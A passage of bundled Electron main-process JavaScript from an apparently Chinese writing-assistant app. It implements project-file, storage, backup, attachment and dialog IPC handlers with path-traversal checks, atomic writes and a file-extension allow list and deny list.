          if (e.kind === "compressed-too-large") {
            logger.audit("security.size", "projectFile:read rejected: file too large", { size: e.context.size });
          } else if (e.kind === "uncompressed-too-large") {
            logger.audit("security.size", "projectFile:read rejected: uncompressed size exceeds 500MB", { total: e.context.total });
          } else if (e.kind === "too-many-versions") {
            logger.audit("security.size", "projectFile:read rejected: too many version entries", { count: e.context.count });
          }
          return { success: false, error: e.message };
        }
        logger.error("projectFile:read error", e instanceof Error ? e : { error: String(e) });
        return { success: false, error: "\u8BFB\u53D6\u5DE5\u7A0B\u6587\u4EF6\u5931\u8D25\uFF0C\u8BF7\u68C0\u67E5\u6587\u4EF6\u662F\u5426\u635F\u574F\u6216\u6743\u9650" };
      }
    } catch (e) {
      logger.error("projectFile:read error", e instanceof Error ? e : { error: String(e) });
      return { success: false, error: "\u8BFB\u53D6\u5DE5\u7A0B\u6587\u4EF6\u5931\u8D25\uFF0C\u8BF7\u68C0\u67E5\u6587\u4EF6\u662F\u5426\u635F\u574F\u6216\u6743\u9650" };
    }
  });
  safeIpcHandle("projectFile:write", async (_event, filePath, data) => {
    try {
      const pathCheck = await validatePathAndAudit(
        "projectFile:write",
        filePath,
        isSafeProjectFilePath,
        getAllowedProjectFileRoots(),
        { invalidError: "\u975E\u6CD5\u7684\u5DE5\u7A0B\u6587\u4EF6\u8DEF\u5F84" }
      );
      if (!pathCheck.ok) return { success: false, error: pathCheck.error };
      return await withWriteMutex(filePath, async () => {
        if (!isValidProjectFileData(data)) {
          logger.audit("security.schema", "projectFile:write rejected: invalid data shape", { filePath });
          return { success: false, error: "\u5DE5\u7A0B\u6587\u4EF6\u6570\u636E\u5F62\u72B6\u65E0\u6548\uFF08project \u5FC5\u987B\u662F\u5BF9\u8C61\uFF0C6 \u4E2A\u96C6\u5408\u5FC5\u987B\u662F\u6570\u7EC4\uFF09" };
        }
        await ensureDir(filePath);
        const tempPath = `${filePath}.${(0, import_node_crypto2.randomUUID)()}.tmp`;
        const backupPath = `${filePath}.${(0, import_node_crypto2.randomUUID)()}.bak`;
        const buffer = await generateProjectFileBuffer(data);
        if (await pathExists(filePath)) {
          await import_promises3.default.copyFile(filePath, backupPath);
        }
        try {
          await import_promises3.default.writeFile(tempPath, buffer);
          const tempStats = await import_promises3.default.stat(tempPath);
          if (tempStats.size < 10) {
            return { success: false, error: "\u751F\u6210\u7684\u6587\u4EF6\u8FC7\u5C0F\uFF0C\u53EF\u80FD\u5DF2\u635F\u574F" };
          }
          await import_promises3.default.rename(tempPath, filePath);
          await import_promises3.default.unlink(backupPath).catch(() => {
          });
          await cleanupOldBackups(filePath);
          return { success: true };
        } finally {
          await import_promises3.default.unlink(tempPath).catch(() => {
          });
          await import_promises3.default.unlink(backupPath).catch(() => {
          });
        }
      });
    } catch (e) {
      logger.error("projectFile:write error", e instanceof Error ? e : { error: String(e) });
      return { success: false, error: "\u5199\u5165\u5DE5\u7A0B\u6587\u4EF6\u5931\u8D25\uFF0C\u8BF7\u68C0\u67E5\u8DEF\u5F84\u6743\u9650\u6216\u78C1\u76D8\u7A7A\u95F4" };
    }
  });
  safeIpcHandle("projectFile:validate", async (_event, filePath) => {
    try {
      const pathCheck = await validatePathAndAudit(
        "projectFile:validate",
        filePath,
        isSafeProjectFilePath,
        getAllowedProjectFileRoots(),
        { invalidError: "\u975E\u6CD5\u7684\u5DE5\u7A0B\u6587\u4EF6\u8DEF\u5F84" }
      );
      if (!pathCheck.ok) return { valid: false, error: pathCheck.error };
      const buffer = await import_promises3.default.readFile(filePath);
      const zip = await import_jszip2.default.loadAsync(buffer);
      const requiredFiles = ["metadata.json", "project.json", "chapters.json"];
      for (const file of requiredFiles) {
        if (!zip.file(file)) {
          return { valid: false, error: `\u7F3A\u5C11\u5FC5\u8981\u6587\u4EF6: ${file}` };
        }
      }
      const metadataStr = await zip.file("metadata.json")?.async("string");
      if (!metadataStr) {
        return { valid: false, error: "\u65E0\u6548\u7684\u5143\u6570\u636E" };
      }
      const metadata = JSON.parse(metadataStr);
      if (metadata.version !== FILE_VERSION) {
        return { valid: false, error: `\u7248\u672C\u4E0D\u517C\u5BB9` };
      }
      return { valid: true };
    } catch (e) {
      logger.error("projectFile:validate error", e instanceof Error ? e : { error: String(e) });
      return { valid: false, error: "\u6587\u4EF6\u6821\u9A8C\u5931\u8D25\uFF0C\u8BF7\u68C0\u67E5\u6587\u4EF6\u662F\u5426\u635F\u574F\u6216\u6743\u9650" };
    }
  });
  safeIpcHandle("projectFile:backup", async (_event, filePath, keepCount = 5) => {
    try {
      const pathCheck = await validatePathAndAudit(
        "projectFile:backup",
        filePath,
        isSafeProjectFilePath,
        getAllowedProjectFileRoots(),
        { invalidError: "\u975E\u6CD5\u7684\u5DE5\u7A0B\u6587\u4EF6\u8DEF\u5F84" }
      );
      if (!pathCheck.ok) return { success: false, error: pathCheck.error };
      const backupsDir = import_node_path4.default.join(getBackupsDir(), import_node_path4.default.basename(filePath));
      await ensureDir(backupsDir);
      const ts = formatBackupTimestamp();
      const backupPath = import_node_path4.default.join(backupsDir, `${ts}.cwp`);
      await import_promises3.default.copyFile(filePath, backupPath);
      const backups = (await import_promises3.default.readdir(backupsDir)).sort().reverse();
      for (const old of backups.slice(keepCount)) {
        await import_promises3.default.rm(import_node_path4.default.join(backupsDir, old), { force: true });
      }
      return { success: true };
    } catch (e) {
      logger.error("projectFile:backup error", e instanceof Error ? e : { error: String(e) });
      return { success: false, error: "\u5907\u4EFD\u5DE5\u7A0B\u6587\u4EF6\u5931\u8D25\uFF0C\u8BF7\u68C0\u67E5\u8DEF\u5F84\u6743\u9650\u6216\u78C1\u76D8\u7A7A\u95F4" };
    }
  });
  safeIpcHandle("projectFile:listBackups", async (_event, filePath) => {
    try {
      const pathCheck = await validatePathAndAudit(
        "projectFile:listBackups",
        filePath,
        isSafeProjectFilePath,
        getAllowedProjectFileRoots(),
        { invalidError: "\u975E\u6CD5\u7684\u5DE5\u7A0B\u6587\u4EF6\u8DEF\u5F84" }
      );
      if (!pathCheck.ok) return { success: false, backups: [] };
      const backupsDir = import_node_path4.default.join(getBackupsDir(), import_node_path4.default.basename(filePath));
      if (!await pathExists(backupsDir)) return { success: true, backups: [] };
      const backups = (await import_promises3.default.readdir(backupsDir)).sort().reverse();
      return {
        success: true,
        backups: backups.map((name) => ({
          name,
          path: import_node_path4.default.join(backupsDir, name),
          timestamp: name.replace(".cwp", "")
        }))
      };
    } catch (e) {
      logger.error("projectFile:listBackups error", e instanceof Error ? e : { error: String(e) });
      return { success: false, error: "\u5217\u51FA\u5907\u4EFD\u5931\u8D25\uFF0C\u8BF7\u68C0\u67E5\u8DEF\u5F84\u6743\u9650" };
    }
  });
  safeIpcHandle("projectFile:restoreBackup", async (_event, backupPath, targetPath) => {
    try {
      const backupCheck = await validatePathAndAudit(
        "projectFile:restoreBackup",
        backupPath,
        isSafeBackupPath,
        [getBackupsDir()],
        { invalidError: "\u975E\u6CD5\u7684\u5907\u4EFD\u8DEF\u5F84" }
      );
      if (!backupCheck.ok) return { success: false, error: backupCheck.error };
      const targetCheck = await validatePathAndAudit(
        "projectFile:restoreBackup",
        targetPath,
        isSafeProjectFilePath,
        getAllowedProjectFileRoots(),
        { invalidError: "\u975E\u6CD5\u7684\u76EE\u6807\u8DEF\u5F84" }
      );
      if (!targetCheck.ok) return { success: false, error: targetCheck.error };
      await import_promises3.default.copyFile(backupPath, targetPath);
      return { success: true };
    } catch (e) {
      logger.error("projectFile:restoreBackup error", e instanceof Error ? e : { error: String(e) });
      return { success: false, error: "\u6062\u590D\u5907\u4EFD\u5931\u8D25\uFF0C\u8BF7\u68C0\u67E5\u8DEF\u5F84\u6743\u9650\u6216\u78C1\u76D8\u7A7A\u95F4" };
    }
  });
  safeIpcHandle("projectFile:openDialog", async () => {
    const mainWindow = getMainWindow();
    if (!mainWindow) return null;
    const result = await import_electron3.dialog.showOpenDialog(mainWindow, {
      properties: ["openFile"],
      title: "\u6253\u5F00\u5DE5\u7A0B\u6587\u4EF6",
      filters: [{ name: "\u7075\u7280\u5199\u4F5C\u52A9\u624B\u5DE5\u7A0B", extensions: ["cwp"] }]
    });
    if (result.canceled || result.filePaths.length === 0) return null;
    return result.filePaths[0];
  });
  safeIpcHandle("projectFile:saveDialog", async (_event, defaultName) => {
    const mainWindow = getMainWindow();
    if (!mainWindow) return null;
    const result = await import_electron3.dialog.showSaveDialog(mainWindow, {
      title: "\u4FDD\u5B58\u5DE5\u7A0B\u6587\u4EF6",
      defaultPath: defaultName,
      filters: [{ name: "\u7075\u7280\u5199\u4F5C\u52A9\u624B\u5DE5\u7A0B", extensions: ["cwp"] }]
    });
    if (result.canceled || !result.filePath) return null;
    return result.filePath;
  });
}
async function cleanupOldBackups(filePath, keepCount = 5) {
  const backupsDir = import_node_path4.default.join(getBackupsDir(), import_node_path4.default.basename(filePath));
  if (!await pathExists(backupsDir)) return;
  const backups = (await import_promises3.default.readdir(backupsDir)).sort().reverse();
  for (const old of backups.slice(keepCount)) {
    await import_promises3.default.rm(import_node_path4.default.join(backupsDir, old), { force: true }).catch(() => {
    });
  }
}

// electron/handlers/storage/globalStorage.ts
var import_node_path6 = __toESM(require("node:path"), 1);
var import_promises4 = __toESM(require("node:fs/promises"), 1);
var import_node_crypto3 = require("node:crypto");

// electron/handlers/storage.logic.ts
function getProjectId(p) {
  if (p && typeof p === "object" && "id" in p && typeof p.id === "string") {
    return p.id;
  }
  return null;
}
function applyProjectsOps(current, ops) {
  let arr = [...current];
  for (const op of ops) {
    switch (op.type) {
      case "add": {
        const newId = getProjectId(op.project);
        if (newId) {
          arr = arr.map((p) => getProjectId(p) === newId ? op.project : p);
          if (!arr.some((p) => getProjectId(p) === newId)) arr.push(op.project);
        } else {
          arr.push(op.project);
        }
        break;
      }
      case "remove": {
        arr = arr.filter((p) => getProjectId(p) !== op.id);
        break;
      }
      case "update": {
        const newId = getProjectId(op.project);
        if (!newId) return null;
        let found = false;
        arr = arr.map((p) => {
          if (getProjectId(p) === newId) {
            found = true;
            return { ...p, ...op.project };
          }
          return p;
        });
        if (!found) arr.push(op.project);
        break;
      }
      case "clear": {
        arr = [];
        break;
      }
      default:
        return null;
    }
  }
  return arr;
}

// electron/handlers/storage/internal.ts
var import_node_path5 = __toESM(require("node:path"), 1);
var ALLOWED_PROJECT_SUBKEYS = /* @__PURE__ */ new Set([
  "chapters",
  "characters",
  "settingCategories",
  "settingItems",
  "foreshadows",
  "materials",
  "versions"
]);
function resolveFilePath(key) {
  if (!key || typeof key !== "string" || key.includes("..") || key.includes("/") || key.includes("\\") || key.includes("\0")) {
    throw new Error("Invalid storage key");
  }
  if (key.startsWith("project_")) {
    const rest = key.slice("project_".length);
    const underscoreIdx = rest.indexOf("_");
    if (underscoreIdx === -1) {
      const resolved3 = import_node_path5.default.join(getProjectsDir(), rest, "main.json");
      if (!resolved3.startsWith(getProjectsDir())) throw new Error("Path traversal detected");
      return resolved3;
    }
    const projectId = rest.slice(0, underscoreIdx);
    const subkey = rest.slice(underscoreIdx + 1);
    if (!ALLOWED_PROJECT_SUBKEYS.has(subkey)) {
      throw new Error(`Invalid project subkey: ${subkey}`);
    }
    if (projectId.includes("..") || projectId.includes("/") || projectId.includes("\\")) {
      throw new Error("Invalid projectId");
    }
    const resolved2 = import_node_path5.default.join(getProjectsDir(), projectId, `${subkey}.json`);
    if (!resolved2.startsWith(getProjectsDir())) throw new Error("Path traversal detected");
    return resolved2;
  }
  const resolved = import_node_path5.default.join(getDataDir(), `${key}.json`);
  if (!resolved.startsWith(getDataDir())) throw new Error("Path traversal detected");
  return resolved;
}
function resolveDirPath(key) {
  if (!key || typeof key !== "string" || key.includes("..") || key.includes("/") || key.includes("\\") || key.includes("\0")) {
    throw new Error("Invalid storage key");
  }
  if (key.startsWith("project_")) {
    const rest = key.slice("project_".length);
    const underscoreIdx = rest.indexOf("_");
    const projectId = underscoreIdx === -1 ? rest : rest.slice(0, underscoreIdx);
    if (!projectId) throw new Error("Invalid projectId: empty");
    if (projectId.includes("..")) throw new Error("Invalid projectId");
    const resolved = import_node_path5.default.join(getProjectsDir(), projectId);
    if (!resolved.startsWith(getProjectsDir())) throw new Error("Path traversal detected");
    return resolved;
  }
  return getDataDir();
}
var ALLOWED_OPEN_EXTERNAL_EXTS = /* @__PURE__ */ new Set([
  "txt",
  "md",
  "markdown",
  "pdf",
  "png",
  "jpg",
  "jpeg",
  "gif",
  "webp",
  "bmp",
  "mp3",
  "wav",
  "ogg",
  "flac",
  "aac",
  "docx",
  "doc",
  "xlsx",
  "xls",
  "pptx",
  "ppt"
]);
var FORBIDDEN_OPEN_EXTERNAL_EXTS = /* @__PURE__ */ new Set([
  "exe",
  "bat",
  "sh",
  "app",
  "cmd",
  "ps1",
  "com",
  "scr",
  "vbs",
  "js",
  "mjs",
  "jar"
]);
var RECENT_SELECTED_FILES_TTL_MS = 5 * 60 * 1e3;
var recentSelectedFiles = /* @__PURE__ */ new Map();
function rememberSelectedFile(filePath) {
  if (!filePath || typeof filePath !== "string") return;
  const abs = import_node_path5.default.resolve(filePath);
  recentSelectedFiles.set(abs, Date.now());
  const now = Date.now();
  for (const [p, ts] of recentSelectedFiles) {
    if (now - ts > RECENT_SELECTED_FILES_TTL_MS) recentSelectedFiles.delete(p);
  }
}
function isRecentlySelectedFile(filePath) {
  if (typeof filePath !== "string" || !filePath) return false;
  const abs = import_node_path5.default.resolve(filePath);
  const ts = recentSelectedFiles.get(abs);
  if (!ts) return false;
  if (Date.now() - ts > RECENT_SELECTED_FILES_TTL_MS) {
    recentSelectedFiles.delete(abs);
    return false;
  }
  return true;
}
function getRecentlySelectedFilesRealPaths() {
  const now = Date.now();
  const result = [];
  for (const [p, ts] of recentSelectedFiles) {
    if (now - ts <= RECENT_SELECTED_FILES_TTL_MS) result.push(p);
  }
  return result;
}
var MIME_BY_EXT = {
  png: "image/png",
  jpg: "image/jpeg",
  jpeg: "image/jpeg",
  gif: "image/gif",
  webp: "image/webp",
  bmp: "image/bmp",
  svg: "image/svg+xml"
};

// electron/handlers/storage/globalStorage.ts
function registerGlobalStorageHandlers() {
  safeIpcHandle("storage:read", async (_event, key) => {
    try {
      if (!isValidStorageKey(key) && !READ_ONLY_STORAGE_KEYS.has(key)) {
        logger.audit("security.input", "storage:read rejected: invalid storage key", { key });
        return null;
      }
      const filePath = resolveFilePath(key);
      const data = await import_promises4.default.readFile(filePath, "utf-8");
      return JSON.parse(data);
    } catch (e) {
      logger.warn("storage:read failed", { key, error: e instanceof Error ? e.message : String(e) });
      return null;
    }
  });
  safeIpcHandle("storage:write", async (_event, key, value) => {
    try {
      if (!isValidStorageKey(key)) {
        logger.audit("security.input", "storage:write rejected: invalid storage key", { key });
        return false;
      }
      const serialized = JSON.stringify(value);
      if (serialized.length > MAX_STORAGE_VALUE_SIZE) {
        logger.audit("security.size", "storage:write rejected: value too large", {
          key,
          size: serialized.length
        });
        return false;
      }
      const filePath = resolveFilePath(key);
      return await withWriteMutex(filePath, async () => {
        await ensureDir(filePath);
        const tmp = `${filePath}.${(0, import_node_crypto3.randomUUID)()}.tmp`;
        try {
          await import_promises4.default.writeFile(tmp, serialized, "utf-8");
          await import_promises4.default.rename(tmp, filePath);
          return true;
        } finally {
          await import_promises4.default.unlink(tmp).catch(() => {
          });
        }
      });
    } catch (e) {
      logger.error("storage:write error", e instanceof Error ? e : { error: String(e), key });
      return false;
    }
  });
  safeIpcHandle("storage:patchProjects", async (_event, op) => {
    try {
      if (!op || typeof op !== "object" || Array.isArray(op)) return null;
      const o = op;
      const opType = o.type;
      if (typeof opType !== "string") return null;
      if (opType !== "add" && opType !== "remove" && opType !== "update" && opType !== "clear") {
        logger.audit("security.schema", "patchProjects rejected: unknown type", { type: opType });
        return null;
      }
      const DANGEROUS_KEYS = /* @__PURE__ */ new Set(["__proto__", "constructor", "prototype"]);
      const validateProject = (p) => {
        if (!p || typeof p !== "object" || Array.isArray(p)) return false;
        const proj = p;
        if (typeof proj.id !== "string") return false;
        if (!isSafeIdentifier(proj.id)) return false;
        for (const key of Object.keys(proj)) {
          if (DANGEROUS_KEYS.has(key)) return false;
        }
        return true;
      };
      if (opType === "add" || opType === "update") {
        if (!validateProject(o.project)) {
          logger.audit("security.schema", "patchProjects rejected: invalid project", { type: opType });
          return null;
        }
      } else if (opType === "remove") {
        if (typeof o.id !== "string" || !isSafeIdentifier(o.id)) {
          logger.audit("security.schema", "patchProjects rejected: invalid id");
          return null;
        }
      }
      const filePath = resolveFilePath("projects");
      return await withWriteMutex(filePath, async () => {
        let arr = [];
        try {
          const data = await import_promises4.default.readFile(filePath, "utf-8");
          const parsed = JSON.parse(data);
          if (Array.isArray(parsed)) arr = parsed;
        } catch {
        }
        const next = applyProjectsOps(arr, [op]);
        if (next === null) return null;
        arr = next;
        await ensureDir(filePath);
        const tmp = `${filePath}.${(0, import_node_crypto3.randomUUID)()}.tmp`;
        try {
          await import_promises4.default.writeFile(tmp, JSON.stringify(arr), "utf-8");
          await import_promises4.default.rename(tmp, filePath);
          return arr;
        } finally {
          await import_promises4.default.unlink(tmp).catch(() => {
          });
        }
      });
    } catch (e) {
      logger.error("storage:patchProjects error", e instanceof Error ? e : { error: String(e) });
      return null;
    }
  });
  safeIpcHandle("storage:remove", async (_event, key) => {
    try {
      if (!isValidStorageKey(key) && !READ_ONLY_STORAGE_KEYS.has(key)) {
        logger.audit("security.input", "storage:remove rejected: invalid storage key", { key });
        return false;
      }
      if (key.startsWith("project_")) {
        const rest = key.slice("project_".length);
        const isProjectRoot = !rest.includes("_");
        if (isProjectRoot) {
          const dir = resolveDirPath(key);
          const projectsRoot = getProjectsDir();
          if (dir === projectsRoot || !dir.startsWith(projectsRoot + import_node_path6.default.sep)) {
            logger.audit("security.path", "storage:remove refused: resolves to projects root or escapes", { dir });
            return false;
          }
          await import_promises4.default.rm(dir, { recursive: true, force: true });
        } else {
          const filePath = resolveFilePath(key);
          await import_promises4.default.unlink(filePath).catch(() => {
          });
        }
      } else {
        const filePath = resolveFilePath(key);
        await import_promises4.default.unlink(filePath).catch(() => {
        });
      }
      return true;
    } catch (e) {
      logger.error("storage:remove error", e instanceof Error ? e : { error: String(e), key });
      return false;
    }
  });
}

// electron/handlers/storage/projectStorage.ts
var import_node_path7 = __toESM(require("node:path"), 1);
var import_promises5 = __toESM(require("node:fs/promises"), 1);
function registerProjectStorageHandlers() {
  safeIpcHandle("storage:listProjectDirs", async () => {
    try {
      const dir = getProjectsDir();
      if (!await pathExists(dir)) return [];
      const entries = await import_promises5.default.readdir(dir, { withFileTypes: true });
      return entries.filter((e) => e.isDirectory()).map((e) => e.name);
    } catch (e) {
      logger.warn("storage:listProjectDirs failed", { error: e instanceof Error ? e.message : String(e) });
      return [];
    }
  });
  safeIpcHandle("storage:backupProject", async (_event, projectId, keepCount = 5) => {
    try {
      if (!isSafeIdentifier(projectId)) {
        logger.audit("security.path", "backupProject rejected: invalid projectId", { projectId });
        return false;
      }
      const srcDir = import_node_path7.default.join(getProjectsDir(), projectId);
      if (!await pathExists(srcDir)) return false;
      const backupRoot = import_node_path7.default.join(getBackupsDir(), projectId);
      await ensureDir(backupRoot);
      const ts = (/* @__PURE__ */ new Date()).toISOString().replace(/[:.]/g, "-");
      const destDir = import_node_path7.default.join(backupRoot, ts);
      const projectsRoot = import_node_path7.default.resolve(getProjectsDir());
      const backupsRoot = import_node_path7.default.resolve(getBackupsDir());
      const resolvedSrc = import_node_path7.default.resolve(srcDir);
      const resolvedDest = import_node_path7.default.resolve(destDir);
      if (resolvedSrc !== projectsRoot && !resolvedSrc.startsWith(projectsRoot + import_node_path7.default.sep)) {
        logger.audit("security.path", "backupProject rejected: srcDir escapes projects dir", { srcDir });
        return false;
      }
      if (resolvedDest !== backupsRoot && !resolvedDest.startsWith(backupsRoot + import_node_path7.default.sep)) {
        logger.audit("security.path", "backupProject rejected: destDir escapes backups dir", { destDir });
        return false;
      }
      await copyDir(srcDir, destDir);
      const backups = (await import_promises5.default.readdir(backupRoot)).sort().reverse();
      for (const old of backups.slice(keepCount)) {
        await import_promises5.default.rm(import_node_path7.default.join(backupRoot, old), { recursive: true, force: true });
      }
      return true;
    } catch (e) {
      logger.error("backup error", e instanceof Error ? e : { error: String(e) });
      return false;
    }
  });
}

// electron/handlers/storage/fileStorage.ts
var import_node_path8 = __toESM(require("node:path"), 1);
var import_promises6 = __toESM(require("node:fs/promises"), 1);
function registerFileStorageHandlers() {
  safeIpcHandle("storage:readFileBase64", async (_event, filePath) => {
    try {
      const materialsRoot = import_node_path8.default.join(getDataDir(), "materials");
      const resolved = import_node_path8.default.resolve(filePath);
      if (resolved !== materialsRoot && !resolved.startsWith(materialsRoot + import_node_path8.default.sep)) {
        logger.audit("security.path", "readFileBase64 rejected: path outside materials dir", { filePath });
        return null;
      }
      if (!await assertRealPathInside(filePath, [materialsRoot])) {
        logger.audit("security.path", "readFileBase64 rejected: realpath outside materials dir (symlink?)", { filePath });
        return null;
      }
      const buffer = await import_promises6.default.readFile(resolved);
      return buffer.toString("base64");
    } catch {
      return null;
    }
  });
  safeIpcHandle("storage:writeFile", async (_event, filePath, data, encoding) => {
    try {
      if (!isInsideDataDir(filePath)) {
        logger.audit("security.path", "writeFile rejected: path outside data dir", { filePath });
        return false;
      }
      if (!await assertRealPathInside(filePath, [getDataDir()])) {
        logger.audit("security.path", "writeFile rejected: realpath outside data dir (symlink?)", { filePath });
        return false;
      }
      const resolved = import_node_path8.default.resolve(filePath);
      await import_promises6.default.writeFile(resolved, data, { encoding: encoding || "utf-8" });
      return true;
    } catch (e) {
      logger.error("writeFile error", e instanceof Error ? e : { error: String(e) });
      return false;
    }
  });
  safeIpcHandle("storage:writeFileBuffer", async (_event, filePath, base64Data) => {
    try {
      if (!isInsideDataDir(filePath)) {
        logger.audit("security.path", "writeFileBuffer rejected: path outside data dir", { filePath });
        return false;
      }
      if (!await assertRealPathInside(filePath, [getDataDir()])) {
        logger.audit("security.path", "writeFileBuffer rejected: realpath outside data dir (symlink?)", { filePath });
        return false;
      }
      const resolved = import_node_path8.default.resolve(filePath);
      await import_promises6.default.writeFile(resolved, Buffer.from(base64Data, "base64"));
      return true;
    } catch (e) {
      logger.error("writeFileBuffer error", e instanceof Error ? e : { error: String(e) });
      return false;
    }
  });
}

// electron/handlers/storage/dialogHandlers.ts
var import_node_path9 = __toESM(require("node:path"), 1);
var import_promises7 = __toESM(require("node:fs/promises"), 1);
var import_electron4 = require("electron");
function registerDialogHandlers() {
  safeIpcHandle("dialog:selectFile", async () => {
    const mainWindow = getMainWindow();
    if (!mainWindow) return null;
    const result = await import_electron4.dialog.showOpenDialog(mainWindow, {
      properties: ["openFile"],
      title: "\u9009\u62E9\u9644\u4EF6\u6587\u4EF6",
      // filters：与 ALLOWED_OPEN_EXTERNAL_EXTS 保持一致，限制用户可选文件类型。
      // 原先无 filters，用户可选 .exe/.sh 等任意文件，被 material:saveAttachment 原样
      // 复制到 userData/materials/<projectId>/ 落盘，构成钓鱼攻击面。
      filters: [
        { name: "\u5E38\u7528\u6587\u6863\u4E0E\u5A92\u4F53", extensions: ["txt", "md", "markdown", "pdf", "docx", "doc", "xlsx", "xls", "pptx", "ppt"] },
        { name: "\u56FE\u7247", extensions: ["png", "jpg", "jpeg", "gif", "webp", "bmp", "svg"] },
        { name: "\u97F3\u9891", extensions: ["mp3", "wav", "ogg", "flac", "aac", "m4a"] },
        { name: "\u6240\u6709\u6587\u4EF6", extensions: ["*"] }
      ]
    });
    if (result.canceled || result.filePaths.length === 0) return null;
    const filePath = result.filePaths[0];
    rememberSelectedFile(filePath);
    try {
      const stat = await import_promises7.default.stat(filePath);
      return {
        path: filePath,
        name: import_node_path9.default.basename(filePath),
        size: stat.size,
        ext: import_node_path9.default.extname(filePath).slice(1).toLowerCase()
      };
    } catch {
      return null;
    }
  });
  safeIpcHandle("dialog:saveFile", async (_event, defaultName, _data, filterExt) => {
    const mainWindow = getMainWindow();
    if (!mainWindow) return null;
    const safeExt = typeof filterExt === "string" ? filterExt.toLowerCase().replace(/^\./, "") : "";
    if (!EXPORT_ALLOWED_EXTENSIONS.has(`.${safeExt}`)) {
      logger.audit("security.path", "dialog:saveFile rejected: filterExt not in whitelist", { filterExt });
      return null;
    }
    const safeName = typeof defaultName === "string" ? import_node_path9.default.basename(defaultName) : "export";
    const result = await import_electron4.dialog.showSaveDialog(mainWindow, {
      title: "\u4FDD\u5B58\u5BFC\u51FA\u6587\u4EF6",
      defaultPath: safeName,
      filters: [{ name: safeExt.toUpperCase(), extensions: [safeExt] }]
    });
    if (result.canceled || !result.filePath) return null;
    return result.filePath;
  });
}

// electron/handlers/storage/fileExternal.ts
var import_node_path10 = __toESM(require("node:path"), 1);
var import_promises8 = __toESM(require("node:fs/promises"), 1);
var import_electron5 = require("electron");
function registerFileExternalHandlers() {
  safeIpcHandle("file:openExternal", async (_event, filePath) => {
    if (!filePath || typeof filePath !== "string") return false;
    if (!import_node_path10.default.isAbsolute(filePath)) {
      logger.audit("security.path", "openExternal rejected: path must be absolute", { filePath });
      return false;
    }
    if (!isInsideDataDir(filePath) && !isRecentlySelectedFile(filePath)) {
      logger.audit("security.path", "openExternal rejected: outside data dir and not recently selected", { filePath });
      return false;
    }
    if (!await assertRealPathInside(filePath, [getDataDir(), ...getRecentlySelectedFilesRealPaths()])) {
      logger.audit("security.path", "openExternal rejected: realpath outside allowed dirs (symlink?)", { filePath });
      return false;
    }
    const ext = import_node_path10.default.extname(filePath).slice(1).toLowerCase();
    if (FORBIDDEN_OPEN_EXTERNAL_EXTS.has(ext)) {
      logger.audit("security.path", "openExternal rejected: forbidden extension", { ext, filePath });
      return false;
    }
    if (!ext || !ALLOWED_OPEN_EXTERNAL_EXTS.has(ext)) {
      logger.audit("security.path", "openExternal rejected: extension not in allowlist", { ext, filePath });
      return false;
    }
    try {
      await import_electron5.shell.openPath(filePath);
      return true;
    } catch {
      return false;
    }
  });
  safeIpcHandle("file:readDataURL", async (_event, filePath) => {
    if (!filePath || typeof filePath !== "string") {
      return Promise.reject(new Error("invalid filePath"));
    }
    if (!isInsideDataDir(filePath)) {
      logger.audit("security.path", "readDataURL rejected: path outside data dir", { filePath });
      return Promise.reject(new Error("path outside data dir"));
    }
    try {
      if (!await assertRealPathInside(filePath, [getDataDir()])) {
        logger.audit("security.path", "readDataURL rejected: realpath outside data dir (symlink?)", { filePath });
        return Promise.reject(new Error("realpath outside data dir"));
      }
      const resolved = import_node_path10.default.resolve(filePath);
      const stat = await import_promises8.default.stat(resolved);
      if (stat.size > 10 * 1024 * 1024) {
        logger.audit("security.size", "readDataURL rejected: file too large", { size: stat.size });
        return null;
      }
      const buffer = await import_promises8.default.readFile(resolved);
      const ext = import_node_path10.default.extname(resolved).slice(1).toLowerCase();
      const mime = MIME_BY_EXT[ext] || "application/octet-stream";
      return `data:${mime};base64,${buffer.toString("base64")}`;
    } catch (e) {
      logger.error("readDataURL \u5931\u8D25", e instanceof Error ? e : { error: String(e) });
      return Promise.reject(e instanceof Error ? e : new Error(String(e)));
    }
  });
}

// electron/handlers/storage/materialAttachments.ts
var import_node_path11 = __toESM(require("node:path"), 1);
var import_promises9 = __toESM(require("node:fs/promises"), 1);
function registerMaterialAttachmentHandlers() {
  safeIpcHandle("material:saveAttachment", async (_event, sourcePath, projectId, attachmentId) => {
    if (!sourcePath || !projectId || !attachmentId) return null;
    if (!isSafeIdentifier(projectId) || !isSafeIdentifier(attachmentId)) {
      logger.audit("security.path", "saveAttachment rejected: invalid projectId or attachmentId", { projectId, attachmentId });
      return null;
    }
    if (!isRecentlySelectedFile(sourcePath)) {
      logger.audit("security.path", "saveAttachment rejected: sourcePath not in recent selection whitelist", { sourcePath });
      return null;
    }
    try {
      const materialsDir = import_node_path11.default.join(getDataDir(), "materials", projectId);
      await import_promises9.default.mkdir(materialsDir, { recursive: true });
      const ext = import_node_path11.default.extname(sourcePath);
      const destPath = import_node_path11.default.join(materialsDir, `${attachmentId}${ext}`);
      const resolvedDest = import_node_path11.default.resolve(destPath);
      const resolvedMaterialsDir = import_node_path11.default.resolve(materialsDir);
      if (resolvedDest !== resolvedMaterialsDir && !resolvedDest.startsWith(resolvedMaterialsDir + import_node_path11.default.sep)) {
        logger.audit("security.path", "saveAttachment rejected: destPath escapes materials dir", { destPath });
        return null;
      }
      const realSource = await import_promises9.default.realpath(sourcePath).catch(() => null);
      if (!realSource) {
        logger.audit("security.path", "saveAttachment rejected: sourcePath realpath failed", { sourcePath });
        return null;
      }
      if (!isRecentlySelectedFile(realSource)) {
        logger.audit("security.path", "saveAttachment rejected: realpath of source not in recent selection", { sourcePath, realSource });
        return null;
      }
      await import_promises9.default.copyFile(realSource, destPath);
      return destPath;
    } catch (e) {
      logger.error("\u4FDD\u5B58\u7D20\u6750\u9644\u4EF6\u5931\u8D25", e instanceof Error ? e : { error: String(e) });
      return null;
    }
  });
  safeIpcHandle("material:deleteAttachment", async (_event, targetPath) => {
    if (!targetPath || typeof targetPath !== "string") return false;
    try {
      const materialsRoot = import_node_path11.default.join(getDataDir(), "materials");
      const resolved = await import_promises9.default.realpath(targetPath).catch(() => null);
      if (!resolved) return false;
      const resolvedRoot = await import_promises9.default.realpath(materialsRoot).catch(() => materialsRoot);
      const rel = import_node_path11.default.relative(resolvedRoot, resolved);
      if (rel.startsWith("..") || import_node_path11.default.isAbsolute(rel)) {
        logger.audit("security.path", "deleteAttachment rejected: targetPath escapes materials dir", { targetPath });
        return false;
      }
      await import_promises9.default.unlink(resolved);
      return true;
    } catch (e) {
      logger.error("\u5220\u9664\u7D20\u6750\u9644\u4EF6\u5931\u8D25", e instanceof Error ? e : { error: String(e) });
      return false;
    }
  });
}
